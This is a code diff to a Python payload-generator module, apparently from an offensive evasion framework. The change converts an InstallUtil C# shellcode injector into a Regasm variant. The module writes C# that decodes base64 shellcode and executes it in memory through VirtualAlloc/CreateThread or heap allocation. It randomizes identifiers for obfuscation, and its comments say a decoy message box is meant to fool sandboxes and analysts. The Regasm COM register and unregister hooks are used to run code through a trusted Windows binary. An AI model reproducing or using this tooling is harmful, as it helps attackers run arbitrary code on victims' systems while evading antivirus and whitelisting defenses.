@@ -1,6 +1,6 @@
 """
 
-InstallUtil C# inline shellcode injector using the VirtualAlloc()/CreateThread() pattern.
+Regasm C# inline shellcode injector using the VirtualAlloc()/CreateThread() pattern.
 Uses basic variable renaming obfuscation.
 
 Adapated from code from:
@@ -21,12 +21,12 @@ class PayloadModule:
 
     def __init__(self, cli_obj):
         # required
-        self.language = "installutil"
+        self.language = "regasm"
         self.extension = "cs"
         self.rating = "Excellent"
-        self.description = "InstallUtil C# VirtualAlloc method for inline shellcode injection"
-        self.name = "InstallUtil C# Flat Shellcode Injector"
-        self.path = "installutil/shellcode_inject/base64"
+        self.description = "Regasm C# VirtualAlloc method for inline shellcode injection"
+        self.name = "Regasm C# Flat Shellcode Injector"
+        self.path = "regasm/shellcode_inject/base64"
         self.shellcode = shellcode_help.Shellcode(cli_obj)
         self.cli_opts = cli_obj
         self.payload_source_code = ''
@@ -38,8 +38,7 @@ class PayloadModule:
 
         # options we require user ineraction for- format is {OPTION : [Value, Description]]}
         self.required_options = {
-                                    "COMPILE_TO_DLL" : ["N", "Compile to a DLL"],
-                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "COMPILE_TO_DLL" : ["Y", "Compile to a DLL"],
                                     "INJECT_METHOD"  : ["Heap", "Virtual or Heap"],
                                     "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                     "HOSTNAME"       : ["X", "Optional: Required system hostname"],
@@ -73,7 +72,8 @@ class PayloadModule:
         # randomize all our variable names, yo'
         className = bypass_helpers.randomString()
         classNameTwo = bypass_helpers.randomString()
-        classNameThree = bypass_helpers.randomString()
+        namespace = bypass_helpers.randomString()
+        key = bypass_helpers.randomString()
         execName = bypass_helpers.randomString()
         bytearrayName = bypass_helpers.randomString()
         funcAddrName = bypass_helpers.randomString()
@@ -94,19 +94,20 @@ class PayloadModule:
         y = [bypass_helpers.randomString() for x in range(17)]
 
         #required syntax at the beginning of any/all payloads
-        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.Configuration.Install; using System.Windows.Forms;\n"
-        payload_code += "\tpublic class {0} {{\n".format(className)
-        payload_code += "\t\tpublic static void Main()\n\t\t{\n"
+        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
+        payload_code += "namespace {0}\n {{".format(namespace)
+        payload_code += "\n\tpublic class {0} : ServicedComponent {{\n".format(className)
+        # placeholder for legitimate C# program
         # lets add a message box to throw offf sandbox heuristics and analysts :)
-        # there is no decryption routine, troll.level = 9000
-        # TODO: add a fake decryption function that does nothing and accepts messWithAnalystName as a parameter.
-        payload_code += "\t\t\twhile(true)\n{{ MessageBox.Show(\"doge\"); Console.ReadLine();}}\n"
-        payload_code += "\t\t}\n\t}\n\n"
-        payload_code += "\t[System.ComponentModel.RunInstaller(true)]\n"
-        payload_code += "\tpublic class {0} : System.Configuration.Install.Installer\n\t{{\n".format(classNameTwo)
-        payload_code += "\t\tpublic override void Uninstall(System.Collections.IDictionary {0})\n\t\t{{\n".format(savedStateName)
-        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameThree, execName)
-        payload_code += "\n\tpublic class {0}\n\t{{".format(classNameThree)
+        payload_code += '\n\t\tpublic {0}() {{ Console.WriteLine("doge"); }}\n'.format(className)
+        payload_code += "\n\t\t[ComRegisterFunction]"
+        payload_code += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
+        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classNameTwo, execName)
+        payload_code += "\n[ComUnregisterFunction]"
+        payload_code += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
+        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classNameTwo, execName)
+
+        payload_code += "\n\tpublic class {0}\n\t{{".format(classNameTwo)
         if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
             payload_code += """\t\t[DllImport(\"kernel32\")] private static extern IntPtr VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] public static extern bool VirtualProtect(IntPtr %s, uint %s, uint %s, out uint %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, IntPtr %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11], r[12], r[13], r[14], r[15])
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
@@ -115,7 +116,7 @@ class PayloadModule:
         payload_code += "\n\t\tpublic static void {0}() {{\n".format(execName)
         payload_code2, num_tabs_required = gamemaker.senecas_games(self)
         payload_code = payload_code + payload_code2
-        num_tabs_required += 2
+        num_tabs_required += 3
 
         payload_code += '\t' * num_tabs_required + "string %s = System.Text.ASCIIEncoding.ASCII.GetString(Convert.FromBase64String(\"%s\"));\n" % (bytearrayName, Shellcode)
         payload_code += '\t' * num_tabs_required + "string[] chars = %s.Split(',').ToArray();\n" %(bytearrayName)
